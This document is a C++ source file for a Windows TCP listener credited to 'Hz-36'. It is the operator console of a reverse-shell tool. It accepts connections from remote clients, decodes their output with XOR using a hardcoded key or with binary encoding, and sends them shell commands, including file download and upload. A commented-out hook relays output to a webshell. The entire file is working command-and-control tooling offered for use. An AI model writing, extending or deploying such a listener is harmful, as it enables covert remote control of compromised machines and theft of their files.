// Windows TCP Listener C++
// By Hz-36
//
//------------------------------------------------------------------------------------------INCLUDES
#include <iostream>
#include <cstdlib>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <string>
#include <map>
#include <unordered_map>
#include <thread> // Thread Management
#include <chrono> // Time Management
#include <mutex> 
#include <Windows.h>
#include <openssl/aes.h> // AES
#include <bitset> // BIN

#pragma comment(lib, "ws2_32.lib")


//------------------------------------------------------------------------------------------MUTEX -> mtx
std::mutex mtx; // Mutex -> Sync Output 

std::string xClientID = "XCLIENT00001";


//------------------------------------------------------------------------------------------ASCII STARTUP
void PrintAsciiArtBanner() {
    std::cout << "@@@  @@@  @@@@@@@@             @@@@@@     @@@@@@  \n"
        "@@@  @@@  @@@@@@@@             @@@@@@@   @@@@@@@  \n"
        "@@!  @@@       @@!                 @@@  !@@       \n"
        "!@!  @!@      !@!                  @!@  !@!       \n"
        "@!@!@!@!     @!!    @!@!@!@!@  @!@!!@   !!@@!@!   \n"
        "!!!@!!!!    !!!     !!!@!@!!!  !!@!@!   @!!@!!!!  \n"
        "!!:  !!!   !!:                     !!:  !:!  !:!  \n"
        ":!:  !:!  :!:                      :!:  :!:  !:!  \n"
        "::   :::   :: ::::             :: ::::  :::: :::  \n"
        " :   : :  : :: : :              : : :    :: : :   \n" << std::endl;
}


//------------------------------------------------------------------------------------------VALIDATE AND SET ENCRYPTION
int yGlobalEncryption = 0;
void xValidateAndSetEncryption(const std::string& yEncryptionMethod) {
    std::unordered_map<std::string, int> yEncryptionMap = { // Define a Map Associating Encryption Methods with their Corresponding Numbers
        {"aes", 1},
        {"xor", 2},
        {"bin", 3}
    };

    auto it = yEncryptionMap.find(yEncryptionMethod);

    if (it != yEncryptionMap.end()) { // Validate Encryption Method
        yGlobalEncryption = it->second;
    }

    else {
        std::cout << "[!] NO ENCRYPTION SET [!]\n";
        yGlobalEncryption = 0;  // 0 -> No Encryption
    }
}


//------------------------------------------------------------------------------------------AES DECRYPTION 
/*
std::string xDecryptAES(const std::string& yCiphertext, const std::string& yKey, const std::string& iv) {
    AES_KEY decryptKey;
    AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(yKey.c_str()), 128, &decryptKey);

    std::string yDecryptedText;
    yDecryptedText.resize(yCiphertext.size());

    AES_decrypt(reinterpret_cast<const unsigned char*>(yCiphertext.c_str()),
        reinterpret_cast<unsigned char*>(&yDecryptedText[0]),
        &decryptKey);

    return yDecryptedText;
} */


//------------------------------------------------------------------------------------------XOR DECRYPTION 
std::string xDecryptXOR(const std::string& yCiphertext, const std::string& yKey) {
    std::string yDecryptedText;
    yDecryptedText.reserve(yCiphertext.length());

    for (std::size_t i = 0; i < yCiphertext.length(); ++i) {
        yDecryptedText += yCiphertext[i] ^ yKey[i % yKey.length()];
    }

    return yDecryptedText;
}


//------------------------------------------------------------------------------------------BIN DECRYPTION 
std::string xDecryptBinary(const std::string& yEncryptedText) {
    std::string yDecryptedText;

    for (size_t i = 0; i < yEncryptedText.length(); i += 8) {
        std::string byte = yEncryptedText.substr(i, 8);

        unsigned char yDecryptedByte = std::bitset<8>(byte).to_ulong();

        yDecryptedText += yDecryptedByte;
    }

    return yDecryptedText;
}


//------------------------------------------------------------------------------------------HANDLE CLIENT SHELL SESSION FUNCTION
void xHandleClient(SOCKET clientSocket) {
    char yBuffer[1024];
    int yBytesRead;

    while (true) {
        yBytesRead = recv(clientSocket, yBuffer, sizeof(yBuffer), 0);
        if (yBytesRead <= 0) {
            std::cerr << "Connection Closed or Error." << std::endl;
            closesocket(clientSocket);
            return;
        }

        std::string yCommand(yBuffer, yBytesRead); // Received Data -> Output
        {
            std::lock_guard<std::mutex> lock(mtx);

            // Decrypt the command based on yGlobalEncryption
            if (yGlobalEncryption == 1) {
                std::string yDecryptedCommand /*= xDecryptAES(yCommand, aesKey, aesIV)*/;
                std::cout << std::endl << yDecryptedCommand << std::endl;
            }

            else if (yGlobalEncryption == 2) {
                const std::string xorKey = "HUNT3RkEyGenx23KKkwzQUdAq";
                std::string yDecryptedCommand = xDecryptXOR(yCommand, xorKey);
                std::cout << std::endl << yDecryptedCommand << std::endl;
            }

            else if (yGlobalEncryption == 3) {
                std::string yDecryptedText = xDecryptBinary(yCommand);
                std::cout << std::endl << yDecryptedText << std::endl;
            }

            else if (yGlobalEncryption == 0) {
                std::cout << std::endl << yCommand << std::endl;
            }

            //std::cout << std::endl << yCommand << std::endl;

            //xSendAjaxRequest(xClientID, yCommand); // Received Output -> Ajax -> Webshell
        }
    }
}


//------------------------------------------------------------------------------------------INPUT FUNCTION
void xInputThread(SOCKET clientSocket) {
    while (true) {
        std::string yUserInput;

        // Sleep Function is used to prevent against double print Bug (Local Network => 100, Internet => 150 / 175 / 200)
        // Sleep Function can be deleted if -> [std::cout << "Enter a...] is deleted too or commented out
        Sleep(200); // Windows
        //usleep(150); // Linux -> #include <unistd.h>

        std::cout << "Enter a Command: ";
        std::getline(std::cin, yUserInput);

        yUserInput += ' '; // Add Space

        send(clientSocket, yUserInput.c_str(), yUserInput.length(), 0); // Send -> Client

        if (yUserInput == "exit ") { // exit -> End Input Loop
            break;
        } 
        
        else if (yUserInput == "xdownload ") { // Download File
            std::cout << "DOWNLOAD FILES" << std::endl;
            std::cout << "Usage: [File , Destination] file_i_want_to_download.txt , C:/Destination/Path" << std::endl;
        } 
        
        else if (yUserInput == "xupload ") { // Upload File
            std::cout << "UPLOAD FILES" << std::endl;
            std::cout << "Usage: [File , Destination] file_i_want_to_upload.txt , C:/Destination/Path" << std::endl;
        } 
        
        else if (yUserInput.substr(0, 7) == "xcolor ") { // Change Colors
            std::string yUserInput = yUserInput.substr(7); // Extract Font Color and Background Color from User Input
            std::istringstream zIss(yUserInput);
            std::string yFontColor, yBackgroundColor;
            zIss >> yFontColor >> yBackgroundColor;

            std::map<std::string, int> yColorMap = { // Map Input Color Choices to Corresponding Console Color Codes
                {"black", 0}, {"blue", 1}, {"green", 2}, {"aqua", 3},
                {"red", 4}, {"purple", 5}, {"yellow", 6}, {"white", 7},
                {"gray", 8}, {"light_blue", 9}, {"light_green", 10},
                {"light_aqua", 11}, {"light_red", 12}, {"light_purple", 13},
                {"light_yellow", 14}, {"bright_white", 15}
            };

            auto yFontColorCode = yColorMap.find(yFontColor);
            auto yBackgroundColorCode = yColorMap.find(yBackgroundColor);

            if (yFontColorCode != yColorMap.end() && yBackgroundColorCode != yColorMap.end()) { // Check for Valid Colors
                int yFinalColor = yFontColorCode->second + yBackgroundColorCode->second * 16;

                HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); // Change Console Color
                SetConsoleTextAttribute(hConsole, yFinalColor);

                std::cout << "Font Color Set to: " << yFontColor << ", Background Color Set to: " << yBackgroundColor << std::endl;
            }
            else {
                std::cout << "Invalid Color Choice. Please Choose from the Available Colors." << std::endl;
            }
        }
    }
}


//------------------------------------------------------------------------------------------AJAX INPUT FUNCTION
void xAjaxInput(SOCKET clientSocket, const std::string& yCommand) {
    send(clientSocket, yCommand.c_str(), yCommand.length(), 0); // Command -> Client
}


//------------------------------------------------------------------------------------------LISTENER STARTUP FUNCTION
void xStartListener(int yPort) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // WSAStartup Failed
        std::cerr << "WSAStartup Failed!" << std::endl;
        return;
    }

    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Socket Creation Failed 
    if (listener == INVALID_SOCKET) {
        std::cerr << "Socket Creation Failed!" << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(yPort);

    if (bind(listener, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) { // Binding Failed
        std::cerr << "Bind Failed!" << std::endl;
        closesocket(listener);
        WSACleanup();
        return;
    }

    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) { // Listen Failed
        std::cerr << "Listen Failed!" << std::endl;
        closesocket(listener);
        WSACleanup();
        return;
    }

    std::cout << "Listening for Incoming Connections on Port " << yPort << "..." << std::endl;

    while (true) { // True -> Incoming Connection -> Accept
        SOCKET clientSocket = accept(listener, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept Failed!" << std::endl;
            closesocket(listener);
            WSACleanup();
            return;
        }

        system("cls"); // Clear Console

        std::cout << "Received an Incoming Connection!" << std::endl;

        std::thread(xHandleClient, clientSocket).detach(); // Start Thread -> Handle Client Shell
        std::thread(xInputThread, clientSocket).detach(); // Start Thread -> Shell Input
    }

    closesocket(listener);
    WSACleanup();
}


//------------------------------------------------------------------------------------------MAIN FUNCTION
int main() {
    SetConsoleOutputCP(CP_UTF8); // Set Console Output -> UTF8
    PrintAsciiArtBanner(); // Print Ascii Banner
    
    //------------------------------------------------------------------------------------------>STARTUP MENU
    std::string yEncryptionMethod = ""; // User Input -> Encryption Method AES / PGP / XOR / BIN
    int yPort = 0; // User Input -> Listener Port

    std::cout << "-------------------------------------------------" << std::endl;
    std::cout << "Port: ";
    std::cin >> yPort;
    //std::cout << std::endl;

    std::cout << "Encryption Method: ";
    std::cin >> yEncryptionMethod;
    xValidateAndSetEncryption(yEncryptionMethod); 
    std::cout << "-------------------------------------------------" << std::endl;
    std::cout << std::endl;

    //------------------------------------------------------------------------------------------>START LISTENER
    xStartListener(yPort); // Call -> xStartListener Function
    return 0;
}
